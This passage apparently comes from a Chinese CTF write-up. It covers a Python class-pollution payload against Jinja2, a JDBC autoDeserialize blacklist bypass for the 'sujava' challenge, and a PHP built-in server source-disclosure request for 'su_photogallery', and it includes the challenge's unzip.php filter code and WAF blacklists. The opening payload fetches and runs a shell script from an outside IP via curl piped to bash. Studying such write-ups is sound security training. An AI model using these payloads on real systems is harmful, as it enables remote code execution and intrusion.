<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;__init__.__globals__.json.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;*;import os;os.system(&#x27;curl http://156.238.233.9/shell.sh|bash&#x27;);#&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>waf</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">key_blacklist = [</span><br><span class="line">    <span class="string">&#x27;__file__&#x27;</span>, <span class="string">&#x27;app&#x27;</span>, <span class="string">&#x27;router&#x27;</span>, <span class="string">&#x27;name_index&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;directory_handler&#x27;</span>, <span class="string">&#x27;directory_view&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;path&#x27;</span>, <span class="string">&#x27;pardir&#x27;</span>, <span class="string">&#x27;_static_folder&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;0&#x27;</span>,  <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">value_blacklist = [</span><br><span class="line">    <span class="string">&#x27;ls&#x27;</span>, <span class="string">&#x27;dir&#x27;</span>, <span class="string">&#x27;nl&#x27;</span>, <span class="string">&#x27;nc&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;tail&#x27;</span>, <span class="string">&#x27;more&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;cut&#x27;</span>, <span class="string">&#x27;awk&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;strings&#x27;</span>, <span class="string">&#x27;od&#x27;</span>, <span class="string">&#x27;ping&#x27;</span>, <span class="string">&#x27;sort&#x27;</span>, <span class="string">&#x27;ch&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>, <span class="string">&#x27;mod&#x27;</span>, <span class="string">&#x27;sl&#x27;</span>, <span class="string">&#x27;find&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sed&#x27;</span>, <span class="string">&#x27;cp&#x27;</span>, <span class="string">&#x27;mv&#x27;</span>, <span class="string">&#x27;ty&#x27;</span>, <span class="string">&#x27;grep&#x27;</span>, <span class="string">&#x27;fd&#x27;</span>, <span class="string">&#x27;df&#x27;</span>, <span class="string">&#x27;sudo&#x27;</span>, <span class="string">&#x27;more&#x27;</span>, <span class="string">&#x27;cc&#x27;</span>, <span class="string">&#x27;tac&#x27;</span>, <span class="string">&#x27;less&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;head&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;tar&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>, <span class="string">&#x27;gcc&#x27;</span>, <span class="string">&#x27;uniq&#x27;</span>, <span class="string">&#x27;vi&#x27;</span>, <span class="string">&#x27;vim&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;xxd&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;base64&#x27;</span>, <span class="string">&#x27;date&#x27;</span>, <span class="string">&#x27;env&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;wget&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;whoami&#x27;</span>, <span class="string">&#x27;readflag&#x27;</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>





<h2 id="sujava"><a href="#sujava" class="headerlink" title="sujava"></a>sujava</h2><p>我在生成这道题的dockerfile时遇到了一些小差错</p>
<p>第一是dockerfile明明将同目录下的start.sh复制到容器根目录下了运行容器却说找不到start.sh</p>
<p>这是因为下载下来的文件在vscode中打开时默认是CRLF换行符(即windows的标准换行符)</p>
<p>而start.sh是要在Linux中运行的，所以换行符要为LF(即下图右下角)<img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202506192035857.png" alt="image-20250619203531713"></p>
<p>第二就是环境附件没给Java8这个目录，所以我在Windows上把我java8的jdk复制进去了，最后发现Windows版的在Linux中不兼容，运行不了，换成linux版的jdk就成功了。</p>
<p>附件是一个类，hint说给出的源码进行了混淆，用的环境是mysql-connector-8.0.28</p>
<p>下图是用idea直接打开class文件</p>
<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202506221317423.png" alt="image-20250622131745301"></p>
<p>但是如果用jadx对其进行反编译</p>
<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202506221318518.png" alt="image-20250622131806419"></p>
<p>这个类很明显是对传入的数据库连接语句进行了一些黑名单检测</p>
<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202506192049578.png" alt="image-20250619204923528"></p>
<p>有个jdbc路由</p>
<h3 id="做题过程"><a href="#做题过程" class="headerlink" title="做题过程"></a>做题过程</h3><p>当mysql版本为8.x时的攻击payload是<code>jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc</code></p>
<p>而autoDeserialize被ban了</p>
<p>而autoDeserialize字段的作用是当执行<code>SHOW SESSION</code>读取到的结果集的第一，二列有blob类型的值时，自动反序列化。</p>
<p>意思是如果没这个字段了读取了就读取了，而反序列化就是这个漏洞的漏洞点，漏洞点不能替换，所以我认为要么找到一个新的字段能够触发反序列化，要么对黑名单检测进行绕过</p>
<p>但是我没发现有啥地方说了有哪些依赖</p>
<p>我看题目给的jar包，好像一条yso能用的链子都没有</p>
<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202506201509795.png" alt="image-20250620150914679"></p>
<p>这里可以看到username和password并没有合并到connection的url里面。所以可用参数只有host,port,database</p>
<p>反编译一下给的jar包，调试发现extraparam参数要key:value的格式，根据&amp;分割参数通过putVal将key计算hash值后放进map中。</p>
<p>所以user可以放进extraparams,但是因为是通过hash计算放进map中的，放的位置位于下图(不知道这样能不能成功识别user)<img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202506201708048.png"></p>
<p>但是我还是不知道如何绕过autodeserialize检测</p>
<p>nm原来url编码就能绕过(因为mysql-connector支持url编码)</p>
<p>mysql-connection有另一种连接url的格式<img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202506202231897.png" alt="image-20250620223145747"></p>
<p>将所有属性都写成ADDRESS&#x3D;(host&#x3D;)()并对其进行url编码就能绕过。</p>
<p>然后用mysql-fake-server进行文件读取就行，但是我不知道为什么读不了，到connection那一步就一直转圈</p>
<h2 id="su-photogallery"><a href="#su-photogallery" class="headerlink" title="su_photogallery"></a>su_photogallery</h2><p>登录后就一个上传图片的接口,可以发单张图片或者zip，上传文件会发给unzip.php。</p>
<p>访问robots.txt提示访问node.md(每次我都会忘记有robots.txt这个东西)</p>
<p>其实node.md也没什么关键信息（看了wp才知道“不想大费周章改变我原本配置的环境”或许指的就是网站是用php -s 这个平时自己用来测试网站的命令开启的）<img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202506242113775.png" alt="image-20250624211307622"></p>
<p>当使用了PHP Built-in Server（PHP内置服务器）（php -S开启的php服务就是使用的内置服务器）且php&lt;&#x3D;7.4.21时有个漏洞(这题看不到版本，只能自己尝试)</p>
<p>payload（只能用burpsuite,yakit不行，并且要把burpsuite的自动修正Content-length给关了）</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /unzip.php HTTP/1.1</span><br><span class="line">Host: 192.168.31.253:80</span><br><span class="line"></span><br><span class="line">GET /aa.css HTTP/1.1</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202506242121178.png" alt="image-20250624212132110"></p>
<p>成功读到源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: Nbc</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2025-01-13 16:13:46</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@LastEditors</span>: Nbc</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@LastEditTime</span>: 2025-01-13 16:31:53</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@FilePath</span>: \src\unzip.php</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: </span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Copyright (c) 2025 by Nbc, All Rights Reserved. </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_extension</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>, PATHINFO_EXTENSION);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_extension</span>(<span class="params"><span class="variable">$filename</span>,<span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filePath</span> = <span class="variable">$path</span> . DIRECTORY_SEPARATOR . <span class="variable">$filename</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$filePath</span>)) &#123;</span><br><span class="line">        <span class="variable">$extension</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">get_extension</span>(<span class="variable">$filename</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>, [<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">unlink</span>(<span class="variable">$filePath</span>)) &#123;</span><br><span class="line">                <span class="comment">// echo &quot;Fail to delete file: $filename\n&quot;;</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">// echo &quot;This file format is not supported:$extension\n&quot;;</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">// echo &quot;nofile&quot;;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">file_rename</span> (<span class="params"><span class="variable">$path</span>,<span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$randomName</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">uniqid</span>().<span class="title function_ invoke__">rand</span>(<span class="number">0</span>, <span class="number">99999</span>)) . <span class="string">&#x27;.&#x27;</span> . <span class="title function_ invoke__">get_extension</span>(<span class="variable">$file</span>);</span><br><span class="line">                <span class="variable">$oldPath</span> = <span class="variable">$path</span> . DIRECTORY_SEPARATOR . <span class="variable">$file</span>;</span><br><span class="line">                <span class="variable">$newPath</span> = <span class="variable">$path</span> . DIRECTORY_SEPARATOR . <span class="variable">$randomName</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!<span class="title function_ invoke__">rename</span>(<span class="variable">$oldPath</span>, <span class="variable">$newPath</span>)) &#123;</span><br><span class="line">                    <span class="title function_ invoke__">unlink</span>(<span class="variable">$path</span> . DIRECTORY_SEPARATOR . <span class="variable">$file</span>);</span><br><span class="line">                    <span class="comment">// echo &quot;Fail to rename file: $file\n&quot;;</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">move_file</span>(<span class="params"><span class="variable">$path</span>,<span class="variable">$basePath</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="title function_ invoke__">glob</span>(<span class="variable">$path</span> . DIRECTORY_SEPARATOR . <span class="string">&#x27;*&#x27;</span>) <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="variable">$destination</span> = <span class="variable">$basePath</span> . DIRECTORY_SEPARATOR . <span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">rename</span>(<span class="variable">$file</span>, <span class="variable">$destination</span>))&#123;</span><br><span class="line">            <span class="comment">// echo &quot;Fail to rename file: $file\n&quot;;</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_base</span>(<span class="params"><span class="variable">$fileContent</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$keywords</span> = [<span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;base64&#x27;</span>, <span class="string">&#x27;shell_exec&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;passthru&#x27;</span>, <span class="string">&#x27;assert&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;phar&#x27;</span>, <span class="string">&#x27;xml&#x27;</span>, <span class="string">&#x27;DOCTYPE&#x27;</span>, <span class="string">&#x27;iconv&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;hex2bin&#x27;</span>, <span class="string">&#x27;dir&#x27;</span>, <span class="string">&#x27;function&#x27;</span>, <span class="string">&#x27;pcntl_exec&#x27;</span>, <span class="string">&#x27;array&#x27;</span>, <span class="string">&#x27;include&#x27;</span>, <span class="string">&#x27;require&#x27;</span>, <span class="string">&#x27;call_user_func&#x27;</span>, <span class="string">&#x27;getallheaders&#x27;</span>, <span class="string">&#x27;get_defined_vars&#x27;</span>,<span class="string">&#x27;info&#x27;</span>];</span><br><span class="line">    <span class="variable">$base64_keywords</span> = [];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$keywords</span> <span class="keyword">as</span> <span class="variable">$keyword</span>) &#123;</span><br><span class="line">        <span class="variable">$base64_keywords</span>[] = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$keyword</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$base64_keywords</span> <span class="keyword">as</span> <span class="variable">$base64_keyword</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$fileContent</span>, <span class="variable">$base64_keyword</span>)!== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_content</span>(<span class="params"><span class="variable">$zip</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$zip</span>-&gt;numFiles; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$fileInfo</span> = <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">statIndex</span>(<span class="variable">$i</span>);</span><br><span class="line">        <span class="variable">$fileName</span> = <span class="variable">$fileInfo</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\.(\/|\.|%2e%2e%2f)/i&#x27;</span>, <span class="variable">$fileName</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">        &#125;</span><br><span class="line">            <span class="comment">// echo &quot;Checking file: $fileName\n&quot;;</span></span><br><span class="line">            <span class="variable">$fileContent</span> = <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">getFromName</span>(<span class="variable">$fileName</span>);</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(eval|base64|shell_exec|system|passthru|assert|flag|exec|phar|xml|DOCTYPE|iconv|zip|file|chr|hex2bin|dir|function|pcntl_exec|array|include|require|call_user_func|getallheaders|get_defined_vars|info)/i&#x27;</span>, <span class="variable">$fileContent</span>) || <span class="title function_ invoke__">check_base</span>(<span class="variable">$fileContent</span>)) &#123;</span><br><span class="line">                <span class="comment">// echo &quot;Don&#x27;t hack me!\n&quot;;    </span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unzip</span>(<span class="params"><span class="variable">$zipname</span>, <span class="variable">$basePath</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$zip</span> = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$zipname</span>)) &#123;</span><br><span class="line">        <span class="comment">// echo &quot;Zip file does not exist&quot;;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;zip_not_found&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$zipname</span>)) &#123;</span><br><span class="line">        <span class="comment">// echo &quot;Fail to open zip file&quot;;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;zip_open_failed&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">check_content</span>(<span class="variable">$zip</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;malicious_content_detected&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$randomDir</span> = <span class="string">&#x27;tmp_&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">uniqid</span>().<span class="title function_ invoke__">rand</span>(<span class="number">0</span>, <span class="number">99999</span>));</span><br><span class="line">    <span class="variable">$path</span> = <span class="variable">$basePath</span> . DIRECTORY_SEPARATOR . <span class="variable">$randomDir</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">mkdir</span>(<span class="variable">$path</span>, <span class="number">0777</span>, <span class="literal">true</span>)) &#123;</span><br><span class="line">        <span class="comment">// echo &quot;Fail to create directory&quot;;</span></span><br><span class="line">        <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;mkdir_failed&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">extractTo</span>(<span class="variable">$path</span>)) &#123;</span><br><span class="line">        <span class="comment">// echo &quot;Fail to extract zip file&quot;;</span></span><br><span class="line">        <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$zip</span>-&gt;numFiles; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$fileInfo</span> = <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">statIndex</span>(<span class="variable">$i</span>);</span><br><span class="line">            <span class="variable">$fileName</span> = <span class="variable">$fileInfo</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">check_extension</span>(<span class="variable">$fileName</span>, <span class="variable">$path</span>)) &#123;</span><br><span class="line">                <span class="comment">// echo &quot;Unsupported file extension&quot;;</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">file_rename</span>(<span class="variable">$path</span>, <span class="variable">$fileName</span>)) &#123;</span><br><span class="line">                <span class="comment">// echo &quot;File rename failed&quot;;</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">move_file</span>(<span class="variable">$path</span>, <span class="variable">$basePath</span>)) &#123;</span><br><span class="line">        <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">        <span class="comment">// echo &quot;Fail to move file&quot;;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;move_failed&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">rmdir</span>(<span class="variable">$path</span>);</span><br><span class="line">    <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$uploadDir</span> = <span class="keyword">__DIR__</span> . DIRECTORY_SEPARATOR . <span class="string">&#x27;upload/suimages/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$uploadDir</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$uploadDir</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] === UPLOAD_ERR_OK) &#123;</span><br><span class="line">    <span class="variable">$uploadedFile</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$zipname</span> = <span class="variable">$uploadedFile</span>[<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$path</span> = <span class="variable">$uploadDir</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">unzip</span>(<span class="variable">$zipname</span>, <span class="variable">$path</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span> === <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.html?status=success&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.html?status=<span class="subst">$result</span>&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> 